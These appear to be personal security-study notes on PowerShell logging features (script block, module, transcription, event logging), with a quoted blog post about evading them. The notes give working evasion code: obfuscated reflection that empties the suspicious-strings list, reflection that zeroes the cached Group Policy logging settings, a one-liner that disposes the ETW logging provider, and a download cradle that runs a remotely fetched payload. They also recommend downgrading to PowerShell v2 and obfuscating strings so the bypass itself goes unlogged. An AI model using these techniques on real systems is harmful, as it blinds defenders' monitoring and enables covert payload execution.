#windows-bypass

powershell version 3 introduced 
- constrained language mode 
- remoting 

powershell version 4 
- script block logging 
- desired state configuration 

powershell version 5 
- just enough admin 
- suspicious script block logging 
- module logging
- transcription logging 

module logging and transcription logging are back ported to version 4 so they also support thsese feature 

powershell version 2 does not have these logging so attackers also downgrade powershell version to version 2 to avoid those extra security measures  ^attacker
![[Pasted image 20240718164130.png]]
```
get-windowoptionalfeature -online -featurename microsoftwindowspowershellv2
```
this command will tell you if  powershell  version 2 can be enables or not 
it will require .NET framework to install powershell version 2 

powershell by default have some minimal logging called event logging or know to windows as **event viewer** 

this contain information about the event that happens 
- for example if you  go to powershell events if you open a new session for powershell which  is also an  event and it will log that event . there we can also identify the version that ps session is working on . we can find if  there is some downgrading happend or not 
- we could also see those providers that we learned in  [[Powershell Fundamentals#Powershell Providers]] starts when we open the a powershell session 

but for logs we have another tool **tailpsoplog** because we have to refersh every time to look for new events in event viewer .

### automatic script block logging
in powershell even if script block logging and module logging are not enable if there is a script which is suspicious powershell will log it 
![[Pasted image 20240720083759.png]]
the tool tailpsoplog uses color codes which tell us a lot about different types of logging being done 

we can on and off logging by editing registory keys . but we have a shortcut to do that in our lab 
   

so when you explicitly turn off logging it will still log suspicious scripts . in module log 
![[Pasted image 20240720121635.png]]
when we on all the reasonable logs it will on script block logging , module logging and transcription logging . you might see some calls being made in logs which you didnt called it is because of something that you called is calling that thing you will se set-strictmode a lot and psreadline as it is  storing commands in the history file 
 
 suspecious script are logged and there content are also logged 
 ![[Pasted image 20240720123425.png]]

when all the logging is on . it will be a mess 
![[Pasted image 20240720181503.png]]
invocation headers and script block invocation logging is on which are not enabled earlier lets see what is the difference in them now 
![[Pasted image 20240720182118.png]]
you will see these start and stop logs which are not that much helpfull

### transcription logging
it stores logs as if we are watching the screen . it stores input and output of command
you can see when the script is invoked in module and script block logging and what is the content of it but you can only get the output of those commnad in transcription logging 

you can configure it to store it somewhere else or the default would be in documents folder 

### Logging Bypassing 
the commands which are declared as malicious like the functions ,cmdlet and win api calls which have those keywords which are mostly used in malware creation and are used by a lot of thread actor are logged even if you didn't enabled any type of logging it will log that script under suspicous script logging . 
![[Pasted image 20240721153830.png]]
to bypass this suspicous script logging we can slightly obfuscate those keywords which are considered as suspicious 
```
PS> [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```
getfield and nonpublic these both are considered suspicous and we just slightly changed them . 

### [The blog where he covered this bypass](https://web.archive.org/web/20201112032014/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html)
Digging through the open-source PowerShell 6.0 GitHub page, what I found is that PowerShell defines a list of strings that are considered “suspicious” and does some string matching to see if a given ScriptBlock contains any of them.

![Suspicious Strings](https://web.archive.org/web/20201112032014im_/https://cobbr.io/assets/images/suspicious-strings.png)

[Check out the code yourself!](https://web.archive.org/web/20201112032014/https://github.com/PowerShell/PowerShell/blob/v6.0.0-alpha.18/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1612-L1660)

to find out what are the strings that powershell is looking for to add them in automatic script block logging 
![[Pasted image 20240721181427.png]]
```
[scriptblock].getfield('signatures','nonpublic,static').getvalue($null) | select -first 10
```
remove select statement if you want to see it all 


**there is also another way to completely disable script block loggin and other loggings** 
# PowerShell ScriptBlock Logging Bypass

18 May 2017

In Windows 10 / PowerShell 5.0, Microsoft introduced several new security features in PowerShell. These included the AMSI, Protected Event Logging, and maybe most importantly **ScriptBlock logging**. The comprehensive ScriptBlock logging now available in PowerShell has presented serious problems for attackers. Now, it is possible for defenders to have access to full logs recording all of an attacker’s malicious PowerShell activity. This has caused some to even suggest that the offensive community should move away from PowerShell altogether.

But all is not lost! (At least not yet)

ScriptBlock logging is enabled through a Group Policy setting, and PowerShell will query that Group Policy setting each time it sees a new ScriptBlock to determine if it should be logged. But it would be silly to query Group Policy _for each ScriptBlock_! Why not just query once and cache the result in memory?

Luckily, PowerShell caches the results of it’s Group Policies in a utility dictionary, so it can query once, remember the value, and simply return that value the next time someone asks for it. Efficiency! Just one problem. You might remember me talking about some PowerShell reflection black magic in [my last post, where I detailed a ScriptBlock Warning-level log bypass](https://web.archive.org/web/20201112015944/https://cobbr.io/(/ScriptBlock-Warning-Event-Logging-Bypass.html)). Well, it gets worse. (Or better, however you look at it.) That cached Group Policy dictionary can be altered with some [Matt Graeber style reflection magic](https://web.archive.org/web/20201112015944/https://twitter.com/mattifestation/status/735261176745988096):

```
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

And for some evidence…

```
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
0
PS> $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
PS> $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
PS> $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
PS> $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
14
PS> "testing 123"
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
14
```

There you have it: ScriptBlock Logging bypass! The best part? **All of this can be done in memory and without administrative privileges!** No need to edit Group Policy settings and no need to edit registry settings.

As a sidenote, remember that just like [the last bypass I posted](https://web.archive.org/web/20201112015944/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html), this only takes affect _after the first ScriptBlock completes_. The bypass itself **will be logged**. With that in mind, I recommend:

- Using obfuscation on the “suspicious” strings in the bypass and/or using the Warning-level log bypass so that the first log doesn’t get logged at the warning level
- Executing your payload using a remote download cradle (bonus points for [obfuscating the cradle](https://web.archive.org/web/20201112015944/https://github.com/danielbohannon/Invoke-CradleCrafter)) so that the payload does not appear in logs at all

Example: [(Gist)](https://web.archive.org/web/20201112015944/https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407)

```
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
```

But we could probably alter **any** of the values in this dictionary, right? So let’s take a look at what’s in there:

```
PS> [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)

Key                         Value
---                         -----
ProtectedEventLogging       {[EnableProtectedEventLogging, 1], [EncryptionCertificate, -----BEGIN CERTIFICATE-----...
Transcription               {[EnableTranscripting, 1], [OutputDirectory, ]}
ScriptBlockLogging          {[EnableScriptBlockLogging, 1], [EnableScriptBlockInvocationLogging, 1]}
ConsoleSessionConfiguration
ModuleLogging               {[EnableModuleLogging, 1], [ModuleNames, System.String[]]}

```

Hmm…

At first, this looks like there is potential for more abuse. Initial testing has showed that simply replacing the values in the dictionary does _not_ work to bypass Transcription logging, Module logging, or ProtectedEventLogging, but this may be a piece of the puzzle and I’ll certainly be looking into those next. In the meantime, be sure to **utilize these other logging types in addition to ScriptBlock logging!**

## Detection?

Unfortunately for defenders, there doesn’t currently seem to be a lot of great ways to detect this happening. Group Policy and registry entries **will still indicate that all logging types are enabled**. The one piece of evidence you _will_ have is the 1 ScriptBlock log that contains the bypass. Defenders could start searching for the bypass within logs, but this could probably be avoided using some more obfuscation techniques.

## Fix?

This could be fixed pretty easily by taking out the Group Policy cache used in PowerShell altogether, though I have no idea how much that could affect performance. If that solution is not a possibility, then this may be a tough fix.


**other than that you should also watch his video on amsi** 

[amsi ryan cobbr](https://www.youtube.com/watch?v=rEFyalXfQWk)

this command can disable all the logging in powershell 
```
([ref].assembly.definedtypes | ? name -like "PSEtwLogProvider")."GetFie`ld"('etwProvider','non'+'public,static').getvalue($null).dispose()
```